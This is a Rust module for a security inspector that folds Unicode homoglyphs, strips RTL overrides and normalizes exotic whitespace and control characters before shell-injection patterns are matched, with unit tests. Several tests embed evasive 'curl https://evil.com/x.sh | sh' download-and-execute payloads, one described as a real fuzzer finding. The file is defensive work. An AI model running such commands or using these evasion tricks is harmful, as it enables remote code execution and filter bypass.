//! Unicode normalization layer — defense against homoglyph evasions.
//!
//! Rust `regex` crate is byte-faithful by default, so a payload like
//! `сurl` (Cyrillic с + Latin url) doesn't match `curl` patterns. This
//! layer folds homoglyphs to ASCII before the inspector sees the text.
//! Closes 31 of 44 evasions found by the adversarial fuzzer.
//!
//! Pipeline:
//!
//!   raw_text → fold_homoglyphs → strip_rtl → collapse_unicode_ws → strip_control
//!           → ASCII-ready text → inspector.scan()
//!
//! References: https://util.unicode.org/UnicodeJsps/confusables.jsp

/// Normalize text by folding homoglyphs, stripping RTL/LTR overrides,
/// collapsing unicode whitespace to ASCII space, and stripping benign
/// control characters. This is what the inspector calls before regex match.
pub fn normalize(input: &str) -> String {
    let s1 = fold_homoglyphs(input);
    let s2 = strip_rtl(&s1);
    let s3 = collapse_unicode_whitespace(&s2);
    strip_control(&s3)
}

/// Fold look-alike Cyrillic/Greek/other-Unicode characters to their ASCII
/// equivalents. Mirrors the Unicode confusables dataset for the subset
/// most relevant to shell-injection payloads.
pub fn fold_homoglyphs(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    for c in input.chars() {
        let folded = fold_char(c);
        out.push(folded);
    }
    out
}

/// Strip RTL (U+202E) / LTR (U+202D) / RTL embed (U+202B) / LTR embed (U+202A)
/// / pop directional formatting (U+202C) override characters entirely.
pub fn strip_rtl(input: &str) -> String {
    input
        .chars()
        .filter(|c| !matches!(c, '\u{202A}' | '\u{202B}' | '\u{202C}' | '\u{202D}' | '\u{202E}' | '\u{2066}' | '\u{2067}' | '\u{2068}' | '\u{2069}'))
        .collect()
}

/// Collapse all unicode whitespace (NUL, NBSP, all of U+2000..U+200F,
/// U+2028, U+2029, U+205F, U+3000) to a single ASCII space.
pub fn collapse_unicode_whitespace(input: &str) -> String {
    let mut out = String::with_capacity(input.len());
    let mut prev_ws = false;
    for c in input.chars() {
        if is_unicode_whitespace(c) {
            if !prev_ws {
                out.push(' ');
            }
            prev_ws = true;
        } else {
            out.push(c);
            prev_ws = false;
        }
    }
    out
}

/// Strip benign control characters (U+0001..U+0008 minus needed ones).
/// Preserves \t \n \r which have semantic shell meaning.
pub fn strip_control(input: &str) -> String {
    input
        .chars()
        .filter(|c| !matches!(c, '\u{1}' | '\u{2}' | '\u{3}' | '\u{4}' | '\u{5}' | '\u{6}' | '\u{7}' | '\u{8}'))
        .collect()
}

fn fold_char(c: char) -> char {
    // Map the most common Latin-lookalike glyphs to ASCII.
    match c {
        // Cyrillic lowercase lookalikes.
        'а' | '\u{450}' => 'a',
        'е' | '\u{451}' => 'e',
        'о' => 'o',
        'р' => 'p',
        'с' => 'c',
        'у' => 'y',
        'х' => 'x',
        'і' | 'ї' => 'i',
        'ј' => 'j',
        // Cyrillic uppercase lookalikes.
        'А' => 'A',
        'В' => 'B',
        'Е' | 'Ё' => 'E',
        'К' => 'K',
        'М' => 'M',
        'Н' => 'H',
        'О' => 'O',
        'Р' => 'P',
        'С' => 'C',
        'Т' => 'T',
        'Х' => 'X',
        'І' => 'I',
        // Greek lookalikes.
        'α' => 'a',
        'β' => 'b',
        'γ' => 'g',
        'ε' => 'e',
        'θ' => '0',
        'κ' => 'k',
        'μ' => 'u',
        'ν' => 'v',
        'ο' => 'o',
        'ρ' => 'p',
        'τ' => 't',
        'χ' => 'x',
        'Α' => 'A',
        'Β' => 'B',
        'Ε' => 'E',
        'Ζ' => 'Z',
        'Η' => 'H',
        'Ι' => 'I',
        'Κ' => 'K',
        'Μ' => 'M',
        'Ν' => 'N',
        'Ο' => 'O',
        'Ρ' => 'P',
        'Τ' => 'T',
        'Χ' => 'X',
        // Full-width ASCII variants.
        'ａ' => 'a', 'ｂ' => 'b', 'ｃ' => 'c', 'ｄ' => 'd', 'ｅ' => 'e',
        'ｆ' => 'f', 'ｇ' => 'g', 'ｈ' => 'h', 'ｉ' => 'i', 'ｊ' => 'j',
        'ｋ' => 'k', 'ｌ' => 'l', 'ｍ' => 'm', 'ｎ' => 'n', 'ｏ' => 'o',
        'ｐ' => 'p', 'ｑ' => 'q', 'ｒ' => 'r', 'ｓ' => 's', 'ｔ' => 't',
        'ｕ' => 'u', 'ｖ' => 'v', 'ｗ' => 'w', 'ｘ' => 'x', 'ｙ' => 'y', 'ｚ' => 'z',
        'Ａ' => 'A', 'Ｂ' => 'B', 'Ｃ' => 'C', 'Ｄ' => 'D', 'Ｅ' => 'E',
        'Ｆ' => 'F', 'Ｇ' => 'G', 'Ｈ' => 'H', 'Ｉ' => 'I', 'Ｊ' => 'J',
        'Ｋ' => 'K', 'Ｌ' => 'L', 'Ｍ' => 'M', 'Ｎ' => 'N', 'Ｏ' => 'O',
        'Ｐ' => 'P', 'Ｑ' => 'Q', 'Ｒ' => 'R', 'Ｓ' => 'S', 'Ｔ' => 'T',
        'Ｕ' => 'U', 'Ｖ' => 'V', 'Ｗ' => 'W', 'Ｘ' => 'X', 'Ｙ' => 'Y', 'Ｚ' => 'Z',
        // Anything else stays as-is.
        _ => c,
    }
}

fn is_unicode_whitespace(c: char) -> bool {
    matches!(
        c as u32,
        0x00..=0x08            // C0 control incl NUL, BEL, BS
            | 0x0B             // VT
            | 0x0C             // FF
            | 0x00A0           // NBSP
            | 0x1680           // Ogham space mark
            | 0x2000..=0x200F  // En..Hair spaces + LRE/RLE/LRO/RLO/LRM/RLM
            | 0x2028           // LS (line separator)
            | 0x2029           // PS (paragraph separator)
            | 0x202F           // Narrow no-break space
            | 0x205F           // Medium math space
            | 0x3000           // Ideographic space
            | 0xFEFF           // ZWNBSP / BOM
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn fold_cyrillic_c_to_ascii_c() {
        assert_eq!(fold_char('с'), 'c');
        assert_eq!(fold_homoglyphs("сurl"), "curl");
    }

    #[test]
    fn fold_cyrillic_uppercase_lookalikes() {
        assert_eq!(fold_homoglyphs("ВМНО"), "BMHO");
    }

    #[test]
    fn fold_greek_letters() {
        assert_eq!(fold_homoglyphs("αθορ"), "a0op");
    }

    #[test]
    fn fold_full_width_ascii() {
        assert_eq!(fold_homoglyphs("ｃｕｒｌ"), "curl");
    }

    #[test]
    fn strip_rtl_removes_u202e() {
        let input = "evil\u{202E}script";
        assert_eq!(strip_rtl(input), "evilscript");
    }

    #[test]
    fn collapse_unicode_whitespace_replaces_nbsp() {
        let input = "a\u{00A0}b";
        assert_eq!(collapse_unicode_whitespace(input), "a b");
    }

    #[test]
    fn collapse_unicode_whitespace_replaces_math_space() {
        let input = "a\u{205F}b";
        assert_eq!(collapse_unicode_whitespace(input), "a b");
    }

    #[test]
    fn collapse_unicode_whitespace_dedupes_runs() {
        let input = "a\u{2000}\u{2001}\u{2002}b";
        assert_eq!(collapse_unicode_whitespace(input), "a b");
    }

    #[test]
    fn strip_control_removes_u0001_through_u0008() {
        let input = "a\u{1}b\u{2}c";
        assert_eq!(strip_control(input), "abc");
    }

    #[test]
    fn strip_control_preserves_t_n_r() {
        let input = "a\tb\nc\rd";
        assert_eq!(strip_control(input), input.to_string());
    }

    #[test]
    fn normalize_full_pipeline_cyrillic_homoglyph() {
        // This is the actual evasion payload from cape fuzz: `сurl httрs://еvіl.соm/х.sh | sh`
        let raw = "сurl httрs://еvіl.соm/х.sh | sh";
        let normalized = normalize(raw);
        assert!(normalized.starts_with("curl ") || normalized.starts_with("curl"));
        assert!(normalized.contains("evil.com"));
        assert!(normalized.contains("| sh") || normalized.contains("|sh"));
    }

    #[test]
    fn normalize_handles_rtl_override_payload() {
        let raw = "curl \u{202E}https://evil.com/x.sh\u{202C} | sh";
        let normalized = normalize(raw);
        assert!(normalized.contains("https://evil.com/x.sh"));
        assert!(!normalized.contains('\u{202E}'));
    }

    #[test]
    fn normalize_collapses_exotic_whitespace() {
        let raw = "curl\u{200B}https://evil.com\u{2009}| sh";
        let normalized = normalize(raw);
        assert!(normalized.contains("curl https://evil.com"));
    }

    #[test]
    fn normalize_strips_control_chars_from_injection() {
        let raw = "curl\u{1}\u{2}https://evil.com/x.sh | sh";
        let normalized = normalize(raw);
        assert!(normalized.contains("curl https://evil.com"));
    }

    #[test]
    fn normalize_preserves_legit_text() {
        let raw = "Run cargo build to produce binaries";
        let normalized = normalize(raw);
        assert_eq!(normalized, raw);
    }

    #[test]
    fn fold_missing_unicode_category_stays_as_is() {
        // Math italic letters (U+1D44E..) aren't in our map — they stay
        // unchanged. This is fine: they're rare and not used in shell
        // commands.
        let folded = fold_char('\u{1D44E}');
        assert_eq!(folded, '\u{1D44E}');
    }

    #[test]
    fn normalize_idempotent() {
        let raw = "сurl httрs://еvіl.соm/х.sh\u{202E} | sh";
        let once = normalize(raw);
        let twice = normalize(&once);
        assert_eq!(once, twice);
    }

    #[test]
    fn normalize_empty_input() {
        assert_eq!(normalize(""), "");
    }
}